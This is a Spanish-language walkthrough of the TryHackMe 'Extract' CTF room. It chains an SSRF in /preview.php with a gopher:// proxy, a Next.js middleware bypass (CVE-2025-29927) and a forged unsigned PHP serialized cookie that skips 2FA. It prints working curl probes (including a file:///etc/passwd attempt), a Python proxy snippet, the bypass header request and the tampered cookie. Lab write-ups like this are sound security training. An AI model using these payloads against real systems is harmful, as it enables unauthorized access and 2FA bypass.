# Extract

| **Dificultad** | Hard |
| **Tipo** | CTF |
| **Slug** | `extract` |
| **Link** | [TryHackMe](https://tryhackme.com/room/extract) |
| **Sección** | 03 Level Hard |
| **Fuente** | Writeups públicos de Jery0843/TryHackMe, jaxafed, matty69v, Majid Banday (Medium), Wild Wild Wolf y 0xb0b. |
| **Componentes** | SSRF / gopher / Next.js / CVE-2025-29927 / PHP serialization / 2FA / Python |
| **Impacto** | Encadenamiento de vulnerabilidades web: SSRF con proxy gopher hacia un servicio interno Next.js, bypass de middleware (CVE-2025-29927) y manipulación de una cookie PHP serializada para saltar el 2FA. |

---

**Contexto:** Extract es un challenge web que encadena varias vulnerabilidades: un SSRF en `/preview.php` (parámetro `url`) bloquea `file://` pero permite `http://` y `gopher://`; se descubre un servicio interno Next.js en el puerto 10000, protegido por middleware vulnerable a CVE-2025-29927 (header `x-middleware-subrequest`), que tras el bypass entrega Flag 1 y las credenciales `librarian:L[REDACTED]!`. El SSRF reconvertido en proxy con gopher también salta la restricción de IP de `/management`, y una cookie PHP serializada no firmada (`O:9:"AuthToken":1:{s:9:"validated";b:0;}`) se altera a `b:1;` para saltar el 2FA y obtener Flag 2.

## Solucionario

### Task 1: Reconocimiento y SSRF en /preview.php

**Explicación:** `nmap -sC -sV -p-` revela dos puertos: 22 (OpenSSH 9.6p1) y 80 (Apache 2.4.58). El sitio "TryBookMe - Online Library" carga la preview de un PDF mediante `/preview.php?url=...`. Probando contra un servidor propio se confirma el SSRF; los esquemas `file://` están bloqueados por keyword pero `http://` y `gopher://` funcionan.

```bash
# confirmar SSRF con un servidor que registre requests
nmap -sC -sV -p- <IP>
curl "http://<IP>/preview.php?url=http://<atacante>/"   # hit recibido
curl "http://<IP>/preview.php?url=file:///etc/passwd"   # bloqueado
curl "http://<IP>/preview.php?url=gopher://127.0.0.1:80/_GET%20/%20HTTP/1.1%0d%0a%0d%0a"  # OK
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | No answer needed | `No answer needed` |

### Task 2: Descubrimiento interno y proxy gopher

**Explicación:** Fuzzeando `http://127.0.0.1:FUZZ/` a través del SSRF se encuentra un servicio interno en el puerto 10000: una aplicación Next.js con un endpoint `/customapi` que responde "Not Authorized". Se escribe un pequeño proxy en Python: escucha en local, recibe la petición, la codifica dos veces en URL y la envía por `gopher://` al servicio interno vía `/preview.php`, devolviendo la respuesta. Así se pueden mandar headers y métodos HTTP arbitrarios que el SSRF directo no permitiría.

```python
import socket
s = socket.socket()
s.bind(("127.0.0.1", 8080))
s.listen(1)
conn, _ = s.accept()
req = conn.recv(4096).decode()
enc = urllib.parse.quote(urllib.parse.quote(req))
payload = f"GET /preview.php?url=gopher://127.0.0.1:10000/_{enc} HTTP/1.1\r\nHost: <IP>\r\nConnection: close\r\n\r\n"
# reenviar payload y volcar la respuesta al cliente local
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | No answer needed | `No answer needed` |

### Task 3: Bypass de middleware Next.js (CVE-2025-29927)

**Explicación:** Se añade el header `x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware` a la petición contra `/customapi`: la autenticación que vive en el middleware de Next.js se bypasea (CVE-2025-29927, el middleware se auto-llama y descarta la comprobación) y la API devuelve la **Flag 1** junto con las credenciales `librarian:L[REDACTED]!`.

```http
GET /customapi HTTP/1.1
Host: 127.0.0.1:10000
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Flag 1 (Next.js /customapi) | `THM{...redacted...}` |

### Task 4: Bypass de 2FA con manipulación de cookies

**Explicación:** Reconfigurando el proxy gopher para apuntar al puerto 80, `/management/` responde desde la IP interna y muestra un login. Con `librarian:L[REDACTED]!` se inicia sesión y la app redirige a `/management/2fa.php`; la cookie `auth_token` contiene `O:9:"AuthToken":1:{s:9:"validated";b:0;}` (objeto PHP serializado, sin firma). Cambiando `b:0;` a `b:1;` el 2FA se considera validado y se obtiene la **Flag 2**.

```http
Cookie: auth_token=O:9:"AuthToken":1:{s:9:"validated";b:1;}
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Flag 2 (management / 2FA) | `THM{...redacted...}` |

---

**Metodología:**
1. **Reconocimiento:** `nmap -sC -sV -p-` muestra 22 (SSH) y 80 (Apache); el sitio solicita PDFs vía `/preview.php?url=...`, que se identifica como vector de SSRF.
2. **Confirmar el SSRF:** `/preview.php?url=http://<IP-propia>/` genera un hit en el servidor del atacante; `file://` está bloqueado por keyword pero `http://` y `gopher://` funcionan.
3. **Enumeración interna:** fuzzing de puertos en `127.0.0.1` vía SSRF descubre el puerto 10000 con una aplicación Next.js y su `/customapi`.
4. **Proxy gopher:** un script Python escucha en local, hace doble URL-encoding de la petición y la entrega por `gopher://` al servicio interno, permitiendo mandar headers y métodos arbitrarios.
5. **Bypass de autenticación:** el header `x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware` explota CVE-2025-29927; `/customapi` devuelve Flag 1 y las credenciales `librarian:L[REDACTED]!`.
6. **Login interno:** apuntando el proxy gopher al puerto 80 se accede a `/management/` desde la IP interna, saltando la restricción de IP; el login con esas credenciales lleva a `/management/2fa.php`.
7. **Bypass de 2FA:** la cookie `auth_token` (objeto PHP serializado sin firma: `O:9:"AuthToken":1:{s:9:"validated";b:0;}`) se modifica de `validated;b:0;` a `validated;b:1;`; se elimina la capa de 2FA y `/management/2fa.php` entrega Flag 2, completando la sala.
8. **Nota:** las flags 1 y 2 solo aparecen redactadas en las fuentes públicas; se documenta el método completo para obtenerlas, no el literal exacto.

**Learning chain:** `nmap → 22 (SSH) + 80 (Apache, TryBookMe) → /preview.php?url= SSRF (file:// bloqueado, gopher:// OK) → fuzzing 127.0.0.1 → puerto 10000 (Next.js /customapi) → proxy local + gopher:// + doble URL-encode → x-middleware-subrequest → CVE-2025-29927 → /customapi → Flag 1 + librarian:L[REDACTED]! → gopher://127.0.0.1:80 → /management/ (bypass IP) → login → cookie auth_token (PHP serialized) → validated;b:0 → b:1 → /management/2fa.php → Flag 2`

**MITRE ATT&CK:** T1190 (Exploit Public-Facing Application), T1090 (Connection Proxy), T1078 (Valid Accounts)

**Fuente:** [TryHackMe - Extract](https://tryhackme.com/room/extract)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
